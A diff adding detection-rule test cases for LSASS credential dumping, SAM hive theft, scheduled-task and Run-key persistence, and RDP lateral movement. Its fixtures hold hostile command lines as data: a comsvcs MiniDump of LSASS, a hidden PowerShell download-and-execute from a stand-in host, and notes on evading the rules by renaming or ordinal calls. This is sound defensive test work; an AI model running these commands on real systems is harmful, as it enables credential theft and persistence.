@@ -33,6 +33,30 @@ def _failures(count: int, spacing: float, user: str = "j.alvarez", src: str = "2
     return [_ev(i, i * spacing, "auth.failure", user_name=user, src_ip=src, host="vpn-gw-01", outcome="failure") for i in range(count)]
 
 
+def _lsass(n: int, source: str, access: str, target: str = "c:\\windows\\system32\\lsass.exe") -> EventView:
+    return _ev(
+        n,
+        0,
+        "process.access",
+        host="fin-ws-014",
+        user_name="j.alvarez",
+        process_name=source.rsplit("\\", 1)[-1],
+        raw={"source_image": source, "target_image": target, "granted_access": access},
+    )
+
+
+def _task(n: int, name: str, action: str) -> EventView:
+    return _ev(n, 0, "task.created", host="fin-ws-014", user_name="j.alvarez", command_line=action, raw={"task_name": name})
+
+
+def _runkey(n: int, value: str, data: str, writer: str, key: str = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run") -> EventView:
+    return _ev(n, 0, "registry.set", host="fin-ws-014", user_name="j.alvarez", process_name=writer, command_line=data, raw={"target_object": f"{key}\\{value}"})
+
+
+def _rdp(n: int, minutes: float, host: str, user: str = "corp\\b.chen", src: str = "10.20.4.17") -> EventView:
+    return _ev(n, minutes, "auth.success", host=host, user_name=user, src_ip=src, outcome="success", raw={"logon_type": "10"})
+
+
 CASES: dict[str, list[Case]] = {
     "SF-AUTH-001": [
         Case("burst then success", "malicious", _failures(8, 0.5) + [_ev(99, 5, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45", host="vpn-gw-01")]),
@@ -246,6 +270,132 @@ CASES: dict[str, list[Case]] = {
                 _ev(2, 3, "proxy.request", host="hr-ws-002", user_name="p.osei", domain="newsletter.example"),
             ],
             known_limitation="The rule cannot tell wanted mail from phishing; it relies on analyst triage.",
+        ),
+    ],
+    "SF-CRED-001": [
+        Case(
+            "mimikatz-style lsass read",
+            "malicious",
+            [_lsass(1, "c:\\users\\public\\m.exe", "0x1010")],
+        ),
+        Case(
+            "comsvcs minidump of lsass",
+            "malicious",
+            [
+                _ev(
+                    1,
+                    0,
+                    "process.start",
+                    host="fin-ws-014",
+                    user_name="j.alvarez",
+                    process_name="rundll32.exe",
+                    command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\l.dmp full",
+                )
+            ],
+        ),
+        Case(
+            "SAM hive saved",
+            "malicious",
+            [_ev(1, 0, "process.start", host="fin-ws-014", user_name="j.alvarez", process_name="reg.exe", command_line="reg.exe save HKLM\\SAM C:\\Windows\\Temp\\s.hiv")],
+        ),
+        Case("defender scanning lsass", "benign", [_lsass(1, "c:\\programdata\\microsoft\\windows defender\\platform\\4.18\\msmpeng.exe", "0x1fffff")]),
+        Case("query-only handle to lsass", "benign", [_lsass(1, "c:\\windows\\system32\\svchost.exe", "0x1000")]),
+        Case("memory read of another process", "benign", [_lsass(1, "c:\\tools\\debugger.exe", "0x1010", target="c:\\windows\\system32\\notepad.exe")]),
+        Case(
+            "dumper renamed to an allowlisted name",
+            "malicious",
+            [_lsass(1, "c:\\users\\public\\msmpeng.exe", "0x1010")],
+            known_limitation="The allowlist matches image names, not paths or signatures, so a renamed tool is missed.",
+        ),
+        Case(
+            "comsvcs called by ordinal",
+            "malicious",
+            [_ev(1, 0, "process.start", host="fin-ws-014", process_name="rundll32.exe", command_line="rundll32.exe comsvcs.dll #24 624 C:\\Windows\\Temp\\l.dmp full")],
+            known_limitation="Calling MiniDump by export ordinal avoids the command-line pattern; Sysmon event 10 would still catch the LSASS read.",
+        ),
+    ],
+    "SF-PERS-001": [
+        Case(
+            "task runs hidden powershell",
+            "malicious",
+            [_task(1, "\\MicrosoftEdgeUpdateCore", "powershell.exe -w hidden -nop -c iex(iwr http://cdn-update.test/a)")],
+        ),
+        Case("task runs a binary from AppData", "malicious", [_task(1, "\\Updater", "C:\\Users\\j.alvarez\\AppData\\Roaming\\svc\\svchost.exe")]),
+        Case(
+            "schtasks create from the command line",
+            "malicious",
+            [
+                _ev(
+                    1,
+                    0,
+                    "process.start",
+                    host="fin-ws-014",
+                    user_name="j.alvarez",
+                    process_name="schtasks.exe",
+                    command_line='schtasks.exe /create /sc onlogon /tn Sync /tr "C:\\Users\\Public\\sync.exe" /ru SYSTEM',
+                )
+            ],
+        ),
+        Case("vendor task under Program Files", "benign", [_task(1, "\\Adobe Acrobat Update Task", "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe")]),
+        Case("schtasks query", "benign", [_ev(1, 0, "process.start", host="fin-ws-014", process_name="schtasks.exe", command_line="schtasks.exe /query /fo LIST")]),
+        Case(
+            "per-user OneDrive updater",
+            "benign",
+            [_task(1, "\\OneDrive Standalone Update Task", "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe")],
+            known_limitation="Legitimate per-user updaters live in AppData and are flagged; tune with a local allowlist.",
+        ),
+    ],
+    "SF-PERS-002": [
+        Case(
+            "run key launches powershell",
+            "malicious",
+            [_runkey(1, "updater", "powershell.exe -w hidden -enc SQBFAFgA", writer="powershell.exe")],
+        ),
+        Case("run key points at Temp", "malicious", [_runkey(1, "svc", "C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\svc.exe", writer="m.exe")]),
+        Case(
+            "reg add to Run",
+            "malicious",
+            [
+                _ev(
+                    1,
+                    0,
+                    "process.start",
+                    host="fin-ws-014",
+                    user_name="j.alvarez",
+                    process_name="reg.exe",
+                    command_line='reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Sync /d "C:\\Users\\Public\\sync.exe" /f',
+                )
+            ],
+        ),
+        Case("installer adds a Program Files app", "benign", [_runkey(1, "SecurityHealth", "C:\\Program Files\\Vendor\\Agent\\agent.exe", writer="msiexec.exe")]),
+        Case(
+            "unrelated registry value",
+            "benign",
+            [_runkey(1, "Theme", "powershell.exe", writer="powershell.exe", key="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize")],
+        ),
+        Case(
+            "renamed copy under Program Files",
+            "malicious",
+            [_runkey(1, "Agent", "C:\\Program Files\\Common Files\\svc.exe", writer="m.exe")],
+            known_limitation="An attacker with admin rights who drops the payload under Program Files is not flagged.",
+        ),
+    ],
+    "SF-LAT-001": [
+        Case("rdp from the internet", "malicious", [_rdp(1, 0, "dc-01", src="203.0.113.77")]),
+        Case("rdp hops across three hosts", "malicious", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 6, "file-srv-01"), _rdp(3, 14, "dc-01")]),
+        Case("single internal rdp session", "benign", [_rdp(1, 0, "file-srv-01")]),
+        Case("two hosts in thirty minutes", "benign", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 20, "file-srv-01")]),
+        Case("three hosts over two hours", "benign", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 50, "file-srv-01"), _rdp(3, 110, "dc-01")]),
+        Case(
+            "external network logon is not rdp",
+            "benign",
+            [_ev(1, 0, "auth.success", host="web-01", user_name="svc_web", src_ip="203.0.113.77", raw={"logon_type": "3"})],
+        ),
+        Case(
+            "admin patching servers",
+            "benign",
+            [_rdp(i, i * 5, f"app-srv-0{i}", user="it.admin") for i in range(1, 5)],
+            known_limitation="Legitimate maintenance across several servers looks the same as lateral movement.",
         ),
     ],
 }
